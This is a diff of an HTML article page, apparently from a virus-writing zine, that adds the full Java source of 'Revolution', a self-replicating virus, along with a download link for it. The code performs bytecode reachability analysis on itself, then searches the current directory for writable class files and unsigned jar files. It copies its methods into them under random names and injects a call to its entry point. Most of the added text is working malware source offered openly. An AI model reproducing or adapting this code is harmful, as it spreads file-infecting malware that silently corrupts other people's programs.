@@ -1,6 +1,6 @@
 <html>
 <head>
-<title>Self-Extraction Using Reachability Analysis and Replication ~ r3s1stanc3</title>
+<title>Self-Extraction Using Reachability Analysis and Replication in Java ~ r3s1stanc3</title>
 <meta charset="utf-8">
 <link href="./style.css" rel="stylesheet" type="text/css">
 <link rel="stylesheet" href="./highlight.min.css">
@@ -23,9 +23,25 @@
                                                        │                 █   █ │
                                                        │                 █▄▄▄█ │
 Self-Extraction Using Reachability                     │                 ▄▄▄▄▄ │
-    Analysis and Replication                           │                   █   │
+    Analysis and Replication in Java                   │                   █   │
                                                        │                   █   │
 ~ r3s1stanc3                                           └───────────────────█ ──┘
+
+Revolution
+ │
+ ├── Makefile
+ ├── Revolution.java
+ ├── revolution.txt
+ │
+ └── demoSource
+     │
+     ├── InterFace.java
+     ├── Chained.java
+     ├── Main.java
+     ├── Rec.java
+     └── NamingConflicts.java
+
+Download <a href="https://tmpout.sh/5/static/16/revolution.zip">revolution.zip</a>
 
 ───[ Table of Contents ]─────────────────────────────────────────────────────
 0 - Intro
@@ -36,6 +52,7 @@ Self-Extraction Using Reachability                     │                 ▄�
 5 - Why Is This Cool?
 6 - Shoutouts
 7 - References
+8 - Source Code
 
 ───[ 0 - Intro ]─────────────────────────────────────────────────────────────
 
@@ -267,6 +284,859 @@ on the JVM.
 [19] <a href="https://86hh.github.io/valhalla/issue%204/articles/hh86/CLASSI.TXT">https://86hh.github.io/valhalla/issue%204/articles/hh86/CLASSI.TXT</a>
 [20] <a href="https://docs.oracle.com/en/java/javase/24/docs/api/java.base/java/lang/ClassLoader.html#getResourceAsStream(java.lang.String)">https://docs.oracle.com/en/java/javase/24/docs/api/java.base/java/lang/ClassLoader.html#getResourceAsStream(java.lang.String)</a>
 [21] <a href="https://www.virusbulletin.com/virusbulletin/2013/12/hands-cookie-jar">https://www.virusbulletin.com/virusbulletin/2013/12/hands-cookie-jar</a>
+
+
+───[ 8 - Source Code ]─────────────────────────────────────────────────────
+
+----------------------------[ Revolution.java ]----------------------------<pre><code class="language-java">
+/// Run `make demo` to build the virus and demo sources into `./demo`. Requires Java 24.
+
+import static java.lang.classfile.ClassFile.ACC_STATIC;
+import static java.lang.constant.ConstantDescs.CLASS_INIT_NAME;
+import static java.lang.constant.ConstantDescs.MTD_void;
+
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.lang.classfile.*;
+import java.lang.classfile.constantpool.*;
+import java.lang.classfile.instruction.*;
+import java.lang.constant.*;
+import java.lang.reflect.AccessFlag;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.StandardCopyOption;
+import java.security.SecureRandom;
+import java.util.*;
+import java.util.function.Consumer;
+import java.util.jar.JarEntry;
+import java.util.jar.JarFile;
+import java.util.jar.JarOutputStream;
+import java.util.stream.Collectors;
+import java.util.stream.Stream;
+import java.util.stream.StreamSupport;
+
+/// Revolution is a self-replicating virus targeting JVM bytecode.
+///
+/// It heavily depends on the new [java.lang.classfile] API and therefore needs
+/// at least Java 24 to work. It can infect plain `.class` files or whole Jar
+/// archives.
+///
+/// When an infected JVM class or archive is executed, it parses itself and
+/// performs reachability analysis to extract a dependency tree of itself (e.g.
+/// all methods that are called during the execution of the virus).
+///
+/// It then searches the current directory for `*.jar` and `*.class` files,
+/// checks if they are already infected by checkig for the existence of a file
+/// named [#MARKER] in the Jar archive or a constant pool entry with the value of
+/// [#MARKER] in a class file.
+///
+/// It then copies its own methods into the class (or a random class in the
+/// archive), renames the methods to get some trivial polymorphism and injects an
+/// invokation of its own entrypoint into a random method of the target class.
+public class Revolution {
+  private static final String MARKER = "doesthislookinfected?";
+  /// String
+  private static final String KEY_OWNER = "owner";
+  /// String
+  private static final String KEY_NAME = "name";
+  /// String
+  private static final String KEY_DESCRIPTOR = "descriptor";
+
+  /// Map&lt;String, ClassModel&gt;
+  private static final String KEY_CLASSES = "classes";
+  /// Map&lt;MemberKey, MethodModel&gt;
+  private static final String KEY_METHODS = "methods";
+  /// Map&lt;String, Integer&gt;
+  private static final String KEY_VERSION = "version";
+
+  private static final String KEY_MAJOR = "major";
+  private static final String KEY_MINOR = "minor";
+
+  /// Descriptor to identify a class member: Owning class, method name,
+  /// method signature/descriptor
+  private static Map&lt;String, String&gt; memberKey(String owner, String name, String descriptor) {
+    return null == descriptor
+        ? Map.of(
+            KEY_OWNER, owner,
+            KEY_NAME, name)
+        : Map.of(
+            KEY_OWNER, owner,
+            KEY_NAME, name,
+            KEY_DESCRIPTOR, descriptor);
+  }
+
+  @SuppressWarnings("unchecked")
+  private static Map&lt;String, ClassModel&gt; classes(Map&lt;?, Map&lt;?, ?&gt;&gt; deps) {
+    return (Map&lt;String, ClassModel&gt;) deps.get(KEY_CLASSES);
+  }
+
+  @SuppressWarnings("unchecked")
+  private static Map&lt;Map&lt;String, String&gt;, MethodModel&gt; methods(Map&lt;?, Map&lt;?, ?&gt;&gt; deps) {
+    return (Map&lt;Map&lt;String, String&gt;, MethodModel&gt;) deps.get(KEY_METHODS);
+  }
+
+  @SuppressWarnings("unchecked")
+  private static Map&lt;String, Integer&gt; version(Map&lt;?, Map&lt;?, ?&gt;&gt; deps) {
+    return (Map&lt;String, Integer&gt;) deps.get(KEY_VERSION);
+  }
+
+  /// Check target of an [InvokeInstruction].
+  private static void handleInvoke(
+      InvokeInstruction invoke,
+      Deque&lt;Map&lt;String, String&gt;&gt; queue,
+      Map&lt;Map&lt;String, String&gt;, MethodModel&gt; visitedMethods) {
+    var owner = invoke.owner().name().stringValue();
+    if (isJdkClass(owner)) {
+      return;
+    }
+
+    var key = memberKey(owner, invoke.name().stringValue(), invoke.typeSymbol().descriptorString());
+
+    if (!visitedMethods.containsKey(key)) {
+      queue.add(key);
+    }
+  }
+
+  /// Check targets of [InvokeDynamicInstruction]s TODO: method references
+  private static void handleInvokeDynamic(
+      InvokeDynamicInstruction indy,
+      Deque&lt;Map&lt;String, String&gt;&gt; queue,
+      Map&lt;Map&lt;String, String&gt;, MethodModel&gt; visited) {
+    for (var arg : indy.invokedynamic().bootstrap().arguments()) {
+      if (arg instanceof MethodHandleEntry mhe) {
+        var owner = mhe.reference().owner().name().stringValue();
+        if (!isJdkClass(owner)) {
+          var name = mhe.asSymbol().methodName();
+          var desc = mhe.asSymbol().lookupDescriptor();
+          var key = memberKey(owner, name, desc);
+          if (!visited.containsKey(key)) {
+            queue.add(key);
+          }
+        }
+      }
+    }
+  }
+
+  /// Check targets of
+  /// [java.lang.classfile.instruction.ConstantInstruction.LoadConstantInstruction]s, e.g.
+  /// constants used by the virus.
+  private static void collectLdcClassRef(
+      Map&lt;String, ClassModel&gt; modelCache,
+      ConstantInstruction.LoadConstantInstruction ldc,
+      Map&lt;String, ClassModel&gt; visitedClasses) {
+    if (ldc.constantEntry() instanceof ClassEntry ce) {
+      var name = ce.name().stringValue();
+      if (!isJdkClass(name)) {
+        var m = modelCache.get(name);
+        if (m != null) {
+          visitedClasses.putIfAbsent(name, m);
+        }
+      }
+    }
+  }
+
+  private static byte[] loadClass(String className) {
+    try (var is = Revolution.class
+        .getClassLoader()
+        .getResourceAsStream(className.replace('.', '/') + ".class")) {
+      return null == is ? null : is.readAllBytes();
+    } catch (IOException e) {
+      return null;
+    }
+  }
+
+  /// Extract the virus' dependency tree from a Jar or class file by performing
+  /// reachability analysis on the bytecode, starting from the virus' entry point.
+  private static Optional&lt;Map&lt;String, Map&lt;?, ?&gt;&gt;&gt; extract(
+      String className, String methodName, String descriptor) throws IOException {
+    var cf = ClassFile.of();
+    var bytecodeCache = new HashMap&lt;String, byte[]&gt;();
+    var modelCache = new HashMap&lt;String, ClassModel&gt;();
+
+    var internalName = className.replace('.', '/');
+
+    var visitedClasses = new LinkedHashMap&lt;String, ClassModel&gt;();
+    var visitedMethods = new LinkedHashMap&lt;Map&lt;String, String&gt;, MethodModel&gt;();
+
+    var queue = new ArrayDeque&lt;Map&lt;String, String&gt;&gt;();
+    queue.add(memberKey(internalName, methodName, descriptor));
+
+    // build dependency tree
+    while (!queue.isEmpty()) {
+      var work = queue.poll();
+
+      if (visitedMethods.containsKey(work)) {
+        continue;
+      }
+
+      var workOwner = work.get(KEY_OWNER);
+
+      var bytecode = bytecodeCache.computeIfAbsent(workOwner, o -&gt; loadClass(o));
+      if (bytecode == null) {
+        continue;
+      }
+
+      var classModel = modelCache.computeIfAbsent(internalName, k -&gt; cf.parse(bytecode));
+
+      visitedClasses.putIfAbsent(workOwner, classModel);
+
+      for (var method : classModel.methods()) {
+        var workName = work.get(KEY_NAME);
+        if (!method.methodName().stringValue().equals(workName)) {
+          continue;
+        }
+
+        var workDesc = work.get(KEY_DESCRIPTOR);
+        var desc = method.methodType().stringValue();
+
+        if (workDesc != null &amp;&amp; !desc.equals(workDesc)) {
+          continue;
+        }
+
+        var key = memberKey(workOwner, workName, desc);
+
+        if (visitedMethods.containsKey(key)) {
+          break;
+        }
+        visitedMethods.put(key, method);
+
+        method
+            .code()
+            .ifPresent(
+                code -&gt; {
+                  for (var element : code) {
+                    switch (element) {
+                      case InvokeInstruction invoke -&gt; handleInvoke(invoke, queue, visitedMethods);
+
+                      case ConstantInstruction.LoadConstantInstruction ldc -&gt;
+                        collectLdcClassRef(modelCache, ldc, visitedClasses);
+
+                      case InvokeDynamicInstruction indy -&gt;
+                        handleInvokeDynamic(indy, queue, visitedMethods);
+
+                      default -&gt; {
+                        /* no additional references */
+                      }
+                    }
+                  }
+                });
+
+        if (workDesc != null) {
+          break;
+        }
+      }
+    }
+
+    // Highest class version of all virus related classes. This determines the
+    // lowest class version
+    // we can try to infect.
+    var highestVersion = Collections.max(modelCache.values(), versionComparator());
+
+    return Optional.of(
+        Map.of(
+            KEY_CLASSES,
+            visitedClasses,
+            KEY_METHODS,
+            visitedMethods,
+            KEY_VERSION,
+            Map.of(
+                KEY_MAJOR,
+                highestVersion.majorVersion(),
+                KEY_MINOR,
+                highestVersion.minorVersion())));
+  }
+
+  private static Comparator&lt;ClassModel&gt; versionComparator() {
+    return Comparator.comparing((ClassModel cm) -&gt; cm.majorVersion())
+        .thenComparing(cm -&gt; cm.minorVersion());
+  }
+
+  // Assuming those classes are always available, they are excluded from the
+  // dependency tree.
+  private static boolean isJdkClass(String internalName) {
+    return internalName.startsWith("java/")
+        || internalName.startsWith("javax/")
+        || internalName.startsWith("jdk/")
+        || internalName.startsWith("sun/")
+        || internalName.startsWith("com/sun/")
+        || internalName.startsWith("com/oracle/")
+        || internalName.startsWith("org/xml/")
+        || internalName.startsWith("org/w3c/")
+        || internalName.startsWith("org/ietf/")
+        || internalName.startsWith("org/omg/")
+        || internalName.startsWith("netscape/");
+  }
+
+  private static String unusedRandomName(Set&lt;String&gt; usedNames) {
+    String result;
+    do {
+      result = randomString();
+    } while (usedNames.contains(result));
+    return result;
+  }
+
+  private static String randomString() {
+    var alphabet = "abcdefghijklmnopqrstuvwxyz".toCharArray();
+
+    var rng = new SecureRandom();
+    var chars = new char[32];
+    for (int i = 0; i &lt; chars.length; i++) {
+      chars[i] = alphabet[rng.nextInt(alphabet.length)];
+    }
+    return new String(chars);
+  }
+
+  /// Merge the virus' code into the target class file and inject a call to the
+  /// virus' entry point.
+  private static byte[] merge(
+      Map&lt;?, Map&lt;?, ?&gt;&gt; deps,
+      String entryPoint,
+      String targetInternalName,
+      ClassFile cf,
+      ClassModel targetModel) {
+    // build rename maps to rename all references to the virus' methods to match the
+    // target class
+    var classRenameMap = buildClassRenameMap(deps, targetInternalName);
+
+    var usedNames = targetModel.methods().stream()
+        .map(mm -&gt; mm.methodName().stringValue())
+        .collect(Collectors.toUnmodifiableSet());
+    var methodRenameMap = buildMethodRenameMap(deps, classRenameMap).keySet().stream()
+        // rename virus methods to get polymorphism
+        .map(s -&gt; Map.entry(s, unusedRandomName(usedNames)))
+        .collect(Collectors.toMap(e -&gt; e.getKey(), e -&gt; e.getValue()));
+
+    var remappedMethods = collectRemappedMethods(cf, deps, classRenameMap, methodRenameMap);
+
+    // candidate methods to inject a call to the entrypoint
+    var methods = targetModel.methods().stream().filter(mm -&gt; mm.code().isPresent()).toList();
+
+    // new name of the entrypoint after renaming all methods
+    var newEntry = methodRenameMap.entrySet().stream()
+        .filter(
+            e -&gt; {
+              var parts = e.getKey().split("#");
+              return parts.length &gt;= 2 &amp;&amp; parts[1].equals(entryPoint);
+            })
+        .map(e -&gt; e.getValue())
+        .findFirst()
+        .get();
+
+    // ClassTransform to inject a call to the virus entrypoint into a random method
+    // or into the
+    // static `&lt;clinit&gt;` block
+    var inject = injectEntryCall(methods, targetInternalName, newEntry);
+
+    return cf.transformClass(
+        targetModel,
+        inject.andThen(
+            // insert virus methods into the target class
+            ClassTransform.endHandler(
+                cb -&gt; {
+                  for (MethodModel m : remappedMethods)
+                    cb.with(m);
+                })));
+  }
+
+  private static ClassTransform injectEntryCall(
+      List&lt;MethodModel&gt; methods, String className, String methodName) {
+    Consumer&lt;CodeBuilder&gt; injectEntryPoint = cb -&gt; cb.invokestatic(ClassDesc.of(className), methodName, MTD_void);
+    if (methods.isEmpty()) {
+      return ClassTransform.endHandler(
+          cb -&gt; cb.withMethodBody(CLASS_INIT_NAME, MTD_void, ACC_STATIC, injectEntryPoint));
+    } else {
+      var targetMethod = methods.get(new SecureRandom().nextInt(methods.size()));
+      return ClassTransform.transformingMethodBodies(
+          mm -&gt; mm.equals(targetMethod),
+          (cb, ce) -&gt; {
+            if (ce instanceof ReturnInstruction) {
+              injectEntryPoint.accept(cb);
+            }
+            cb.with(ce);
+          });
+    }
+  }
+
+  /// Apply the class- and method name changes to the virus code
+  private static List&lt;MethodModel&gt; collectRemappedMethods(
+      ClassFile cf,
+      Map&lt;?, Map&lt;?, ?&gt;&gt; deps,
+      Map&lt;String, String&gt; classRenameMap,
+      Map&lt;String, String&gt; methodRenameMap) {
+    var result = new ArrayList&lt;MethodModel&gt;();
+
+    var classes = classes(deps);
+    var methods = methods(deps);
+
+    for (var entry : methods.entrySet()) {
+      var key = entry.getKey();
+      var keyOwner = key.get(KEY_OWNER);
+      var keyName = key.get(KEY_NAME);
+      var keyDesc = key.get(KEY_DESCRIPTOR);
+
+      var model = entry.getValue();
+      var owner = classes.get(keyOwner);
+      if (owner == null) {
+        continue;
+      }
+
+      var resolvedName = methodRenameMap.get(ownerKey(key));
+
+      var remappedType = remapMethodType(classRenameMap, model.methodTypeSymbol());
+
+      var flags = model.flags().flagsMask();
+
+      byte[] scratch = cf.transformClass(
+          owner,
+          (cb, ce) -&gt; {
+            if (ce instanceof MethodModel mm
+                &amp;&amp; mm.methodName().stringValue().equals(keyName)
+                &amp;&amp; mm.methodType().stringValue().equals(keyDesc)) {
+
+              cb.withMethod(
+                  resolvedName,
+                  remappedType,
+                  flags,
+                  mb -&gt; {
+                    for (MethodElement me : mm) {
+                      if (me instanceof CodeModel code) {
+                        mb.withCode(
+                            cob -&gt; {
+                              remapCode(classRenameMap, methodRenameMap, code, cob);
+                            });
+                      } else {
+                        mb.with(me);
+                      }
+                    }
+                  });
+            }
+          });
+
+      cf.parse(scratch).methods().stream()
+          .filter(m -&gt; m.methodName().stringValue().equals(resolvedName))
+          .findFirst()
+          .ifPresent(mm -&gt; result.add(mm));
+    }
+    return result;
+  }
+
+  private static void remapCode(
+      Map&lt;String, String&gt; classRenameMap,
+      Map&lt;String, String&gt; methodRenameMap,
+      CodeModel source,
+      CodeBuilder builder) {
+    for (var element : source) {
+      remapSingleElement(classRenameMap, methodRenameMap, element, builder);
+    }
+  }
+
+  /// Rewrite references to the virus' methods or constants to their new names
+  private static void remapSingleElement(
+      Map&lt;String, String&gt; classRenameMap,
+      Map&lt;String, String&gt; methodRenameMap,
+      CodeElement element,
+      CodeBuilder builder) {
+    switch (element) {
+      case InvokeInstruction inv when inv.opcode() == Opcode.INVOKESPECIAL -&gt; {
+        var owner = inv.owner().name().stringValue();
+        var name = inv.name().stringValue();
+        var desc = inv.typeSymbol().descriptorString();
+        var newOwner = classRenameMap.getOrDefault(owner, owner);
+        var newName = classRenameMap.containsKey(owner)
+            ? resolvedMethodName(methodRenameMap, owner, name, desc)
+            : name;
+        builder.invokespecial(
+            ClassDesc.ofInternalName(newOwner),
+            newName,
+            remapMethodType(classRenameMap, MethodTypeDesc.ofDescriptor(desc)));
+      }
+
+      case InvokeInstruction invoke -&gt; {
+        var owner = invoke.owner().name().stringValue();
+        var name = invoke.name().stringValue();
+        var desc = invoke.typeSymbol().descriptorString();
+        var newOwner = classRenameMap.getOrDefault(owner, owner);
+        var newName = classRenameMap.containsKey(owner)
+            ? resolvedMethodName(methodRenameMap, owner, name, desc)
+            : name;
+        var newType = remapMethodType(classRenameMap, MethodTypeDesc.ofDescriptor(desc));
+        var newOwnerDesc = ClassDesc.ofInternalName(newOwner);
+        var opcode = invoke.opcode();
+        if (opcode == Opcode.INVOKEINTERFACE) {
+          builder.invokeinterface(newOwnerDesc, newName, newType);
+        } else if (opcode == Opcode.INVOKESTATIC) {
+          builder.invokestatic(newOwnerDesc, newName, newType, invoke.isInterface());
+        } else if (opcode == Opcode.INVOKEVIRTUAL) {
+          builder.invokevirtual(newOwnerDesc, newName, newType);
+        } else {
+          builder.with(element);
+        }
+      }
+
+      case InvokeDynamicInstruction indy -&gt; {
+        var remappedSiteType = remapMethodType(classRenameMap, indy.typeSymbol());
+
+        var remappedArgs = new ArrayList&lt;ConstantDesc&gt;();
+
+        for (var arg : indy.invokedynamic().bootstrap().arguments()) {
+          remappedArgs.add(remapBootstrapArg(classRenameMap, methodRenameMap, arg));
+        }
+
+        var bsmHandle = remapMethodHandle(classRenameMap, methodRenameMap, indy.bootstrapMethod());
+
+        builder.invokedynamic(
+            DynamicCallSiteDesc.of(
+                bsmHandle,
+                indy.name().stringValue(),
+                remappedSiteType,
+                remappedArgs.toArray(ConstantDesc[]::new)));
+      }
+
+      case ConstantInstruction.LoadConstantInstruction ldc when ldc.constantEntry() instanceof ClassEntry ce -&gt; {
+        var src = ce.name().stringValue();
+        var mapped = classRenameMap.getOrDefault(src, src);
+        builder.ldc(ClassDesc.ofInternalName(mapped));
+      }
+
+      default -&gt; builder.with(element);
+    }
+  }
+
+  private static ConstantDesc remapBootstrapArg(
+      Map&lt;String, String&gt; classRenameMap,
+      Map&lt;String, String&gt; methodRenameMap,
+      LoadableConstantEntry arg) {
+    return switch (arg) {
+      case MethodHandleEntry mhe -&gt;
+        remapMethodHandle(classRenameMap, methodRenameMap, mhe.asSymbol());
+
+      case MethodTypeEntry mte -&gt; remapMethodType(classRenameMap, mte.asSymbol());
+
+      case ClassEntry ce -&gt; {
+        String src = ce.name().stringValue();
+        yield ClassDesc.ofInternalName(classRenameMap.getOrDefault(src, src));
+      }
+
+      // Strings, integers, longs, floats, doubles - pass through.
+      default -&gt; arg.constantValue();
+    };
+  }
+
+  private static DirectMethodHandleDesc remapMethodHandle(
+      Map&lt;String, String&gt; classRenameMap,
+      Map&lt;String, String&gt; methodRenameMap,
+      DirectMethodHandleDesc handle) {
+    var owner = handle.owner().descriptorString();
+    var internalOwner = owner.startsWith("L") &amp;&amp; owner.endsWith(";")
+        ? owner.substring(1, owner.length() - 1)
+        : owner;
+
+    var newOwner = classRenameMap.getOrDefault(internalOwner, internalOwner);
+    var newOwnerDesc = ClassDesc.ofInternalName(newOwner);
+
+    var newName = classRenameMap.containsKey(internalOwner)
+        ? resolvedMethodName(
+            methodRenameMap,
+            internalOwner,
+            handle.methodName(),
+            handle.invocationType().descriptorString())
+        : handle.methodName();
+
+    var newType = remapMethodType(classRenameMap, handle.invocationType());
+
+    return MethodHandleDesc.ofMethod(handle.kind(), newOwnerDesc, newName, newType);
+  }
+
+  private static String resolvedMethodName(
+      Map&lt;String, String&gt; methodRenameMap, String owner, String name, String descriptor) {
+    return methodRenameMap.getOrDefault(owner + "#" + name + "#" + descriptor, name);
+  }
+
+  private static MethodTypeDesc remapMethodType(
+      Map&lt;String, String&gt; classRenameMap, MethodTypeDesc original) {
+    var returnType = remapClassDesc(classRenameMap, original.returnType());
+    var newParams = Stream.of(original.parameterArray())
+        .map(param -&gt; remapClassDesc(classRenameMap, param))
+        .toList();
+    return MethodTypeDesc.of(returnType, newParams);
+  }
+
+  private static ClassDesc remapClassDesc(Map&lt;String, String&gt; classRenameMap, ClassDesc desc) {
+    if (desc.isArray()) {
+      return remapClassDesc(classRenameMap, desc.componentType()).arrayType();
+    }
+    if (desc.isPrimitive()) {
+      return desc;
+    }
+    var rawDesc = desc.descriptorString();
+    if (rawDesc.startsWith("L") &amp;&amp; rawDesc.endsWith(";")) {
+      var inner = rawDesc.substring(1, rawDesc.length() - 1);
+      var mapped = classRenameMap.getOrDefault(inner, inner);
+      return ClassDesc.ofInternalName(mapped);
+    }
+    return desc;
+  }
+
+  private static Map&lt;String, String&gt; buildClassRenameMap(
+      Map&lt;?, Map&lt;?, ?&gt;&gt; deps, String targetInternalName) {
+    var map = new HashMap&lt;String, String&gt;();
+    var classes = classes(deps);
+    for (var src : classes.keySet()) {
+      map.put(src, targetInternalName);
+    }
+    return map;
+  }
+
+  private static Map&lt;String, String&gt; buildMethodRenameMap(
+      Map&lt;?, Map&lt;?, ?&gt;&gt; deps, Map&lt;String, String&gt; classRenameMap) {
+    var claimed = new LinkedHashMap&lt;String, String&gt;();
+    var rename = new HashMap&lt;String, String&gt;();
+
+    var methods = methods(deps);
+
+    for (var entry : methods.entrySet()) {
+      var key = entry.getKey();
+
+      var ownerKey = ownerKey(key);
+      var keyName = key.get(KEY_NAME);
+      var keyOwner = key.get(KEY_OWNER);
+      var keyDesc = key.get(KEY_DESCRIPTOR);
+
+      var slot = keyName + remapDescriptor(classRenameMap, keyDesc);
+      if (!claimed.containsKey(slot)) {
+        claimed.put(slot, ownerKey);
+        rename.put(ownerKey, keyName);
+      } else {
+        rename.put(ownerKey, simpleClassName(keyOwner) + "$" + keyName);
+      }
+    }
+    return rename;
+  }
+
+  private static String remapDescriptor(Map&lt;String, String&gt; classRenameMap, String descriptor) {
+    var sb = new StringBuilder();
+    var i = 0;
+    while (i &lt; descriptor.length()) {
+      var c = descriptor.charAt(i);
+      if (c == 'L') {
+        var end = descriptor.indexOf(';', i);
+        var cls = descriptor.substring(i + 1, end);
+        sb.append('L').append(classRenameMap.getOrDefault(cls, cls)).append(';');
+        i = end + 1;
+      } else {
+        sb.append(c);
+        i++;
+      }
+    }
+    return sb.toString();
+  }
+
+  private static String ownerKey(Map&lt;String, String&gt; key) {
+    return key.get(KEY_OWNER) + "#" + key.get(KEY_NAME) + "#" + key.get(KEY_DESCRIPTOR);
+  }
+
+  private static String simpleClassName(String internalName) {
+    var slash = internalName.lastIndexOf('/');
+    return slash &lt; 0 ? internalName : internalName.substring(slash + 1);
+  }
+
+  private static String methodName() {
+    return StackWalker.getInstance().walk(s -&gt; s.skip(1).findFirst()).get().getMethodName();
+  }
+
+  private static void infect(String entryClass, String entryMethod) {
+    try {
+      var optDeps = Revolution.extract(entryClass, entryMethod, null);
+      if (optDeps.isEmpty()) {
+        return;
+      }
+      var deps = optDeps.get();
+      var version = version(deps);
+      var searchPath = Path.of(".");
+      classCandidates(searchPath)
+          .forEach(
+              target -&gt; processClass(deps, entryMethod, target, version)
+                  .ifPresent(content -&gt; write(target, content)));
+
+      jarCandidates(searchPath)
+          .forEach(
+              jar -&gt; processJar(jar, deps, entryMethod, version)
+                  .ifPresent(content -&gt; write(jar, content)));
+    } catch (IOException _) {
+    }
+  }
+
+  private static void write(Path target, byte[] content) {
+    Path temp = null;
+    try {
+      temp = Files.createTempFile(target.getParent(), "", "");
+      Files.write(temp, content);
+      Files.move(temp, target, StandardCopyOption.ATOMIC_MOVE, StandardCopyOption.REPLACE_EXISTING);
+    } catch (IOException _) {
+    } finally {
+      try {
+        if (null != temp) {
+          Files.deleteIfExists(temp);
+        }
+      } catch (IOException _) {
+      }
+    }
+  }
+
+  private static Optional&lt;byte[]&gt; processClass(
+      Map&lt;?, Map&lt;?, ?&gt;&gt; deps, String entryMethod, Path target, Map&lt;String, Integer&gt; version) {
+    try {
+      var targetBytes = Files.readAllBytes(target);
+      return processClass(deps, entryMethod, targetBytes, version);
+    } catch (IOException _) {
+      return Optional.empty();
+    }
+  }
+
+  private static Optional&lt;byte[]&gt; processClass(
+      Map&lt;?, Map&lt;?, ?&gt;&gt; deps,
+      String entryMethod,
+      byte[] targetBytes,
+      Map&lt;String, Integer&gt; version) {
+    var cf = ClassFile.of();
+    var model = cf.parse(targetBytes);
+    if (!canInfectClass(model, version)) {
+      return Optional.empty();
+    }
+    var targetName = model.thisClass().name().stringValue();
+
+    return Optional.of(merge(deps, entryMethod, targetName, cf, model));
+  }
+
+  private static Optional&lt;byte[]&gt; processJar(
+      Path target, Map&lt;?, Map&lt;?, ?&gt;&gt; deps, String entryMethod, Map&lt;String, Integer&gt; version) {
+    try (var jar = new JarFile(target.toFile())) {
+      var replacements = new HashMap&lt;String, byte[]&gt;();
+      for (var entry : Collections.list(jar.entries())) {
+        if (entry.getName().endsWith(".class")) {
+          var content = jar.getInputStream(entry).readAllBytes();
+          var done = processClass(deps, entryMethod, content, version);
+          if (done.isPresent()) {
+            replacements.put(entry.getName(), done.get());
+            break;
+          }
+        }
+      }
+
+      if (replacements.isEmpty()) {
+        return Optional.empty();
+      } else {
+        // place infection marker
+        replacements.put(MARKER, MARKER.getBytes(StandardCharsets.UTF_8));
+        return buildJar(target, replacements);
+      }
+    } catch (IOException _) {
+      return Optional.empty();
+    }
+  }
+
+  /// Rebuild the Jar file under `target`, keeping all of its contents except the
+  /// files from the `content` map.
+  private static Optional&lt;byte[]&gt; buildJar(Path target, Map&lt;String, byte[]&gt; content) {
+    try (var jar = new JarFile(target.toFile());
+        var baos = new ByteArrayOutputStream()) {
+      try (var jos = new JarOutputStream(baos)) {
+        for (var entry : content.entrySet()) {
+          jos.putNextEntry(new JarEntry(entry.getKey()));
+          jos.write(entry.getValue());
+        }
+        for (var entry : Collections.list(jar.entries())) {
+          if (entry.isDirectory() || content.containsKey(entry.getName())) {
+            continue;
+          }
+          jos.putNextEntry(entry);
+          jos.write(jar.getInputStream(entry).readAllBytes());
+        }
+      }
+      return Optional.of(baos.toByteArray());
+    } catch (IOException e) {
+      return Optional.empty();
+    }
+  }
+
+  /// Virus entrypoint. This is where the magic happens!
+  private static void entry() {
+    // if multiple infected classes land in the class path, make sure, the virus is
+    // only executed
+    // once per JVM instance.
+    if (null != System.setProperty(MARKER, "")) {
+      return;
+    }
+
+    new Thread(() -&gt; System.out.println("Sizing the means of execution!")).start();
+
+    // we can get the class and method name of the entrypoint dynamically
+    var entryClass = Revolution.class.getName();
+    var entryMethod = methodName();
+
+    new Thread(() -&gt; infect(entryClass, entryMethod)).start();
+  }
+
+  private static Stream&lt;Path&gt; classCandidates(Path dir) throws IOException {
+    return Files.find(
+        dir,
+        1,
+        (path, attrs) -&gt; path.toString().toLowerCase(Locale.ROOT).endsWith(".class")
+            &amp;&amp; attrs.isRegularFile()
+            &amp;&amp; Files.isReadable(path)
+            &amp;&amp; Files.isWritable(path));
+  }
+
+  private static Stream&lt;Path&gt; jarCandidates(Path dir) throws IOException {
+    return Files.find(
+        dir,
+        1,
+        (path, attrs) -&gt; path.toString().toLowerCase(Locale.ROOT).endsWith(".jar")
+            &amp;&amp; attrs.isRegularFile()
+            &amp;&amp; Files.isReadable(path)
+            &amp;&amp; Files.isWritable(path)
+            &amp;&amp; canInfectJar(path));
+  }
+
+  /// Only infect Jar files that are not signed and do not already contain the
+  /// infection marker.
+  private static boolean canInfectJar(final Path path) {
+    try (var jar = new JarFile(path.toFile())) {
+      var isSigned = jar.getManifest().getAttributes("Signature-Version") != null;
+      return !isSigned
+          &amp;&amp; jar.stream().parallel().noneMatch(entry -&gt; entry.getName().contains(MARKER));
+    } catch (IOException _) {
+      return false;
+    }
+  }
+
+  /// Conditions for class files to be considered infection candidates:
+  /// * class file version is greater or equal to that of the virus
+  /// * is not a Java `record` (e.g. extends `java/lang/Record`)
+  /// * is not an `interface`
+  /// * does not contain [#MARKER] in its
+  ///   [java.lang.classfile.constantpool.ConstantPool]
+  private static boolean canInfectClass(ClassModel target, Map&lt;String, Integer&gt; versions) {
+    return (!(versions.get(KEY_MAJOR) &gt; target.majorVersion()
+        || versions.get(KEY_MINOR) &gt; target.minorVersion()))
+        // skip record classes
+        &amp;&amp; !target
+            .superclass()
+            .map(mm -&gt; mm.asInternalName().equals("java/lang/Record"))
+            .orElse(false)
+        // skip interfaces
+        &amp;&amp; !target.flags().flags().contains(AccessFlag.INTERFACE)
+        // skip classes that contain the infection marker
+        &amp;&amp; StreamSupport.stream(target.constantPool().spliterator(), true)
+            .noneMatch(e -&gt; e instanceof StringEntry se &amp;&amp; se.stringValue().equals(MARKER));
+  }
+
+  public static void main(String[] args) {
+    entry();
+  }
+}
+</code></pre>------------------------------------------------------------------------------
 
 r3s1stanc3 - r3s1stanc3@riseup.net
 
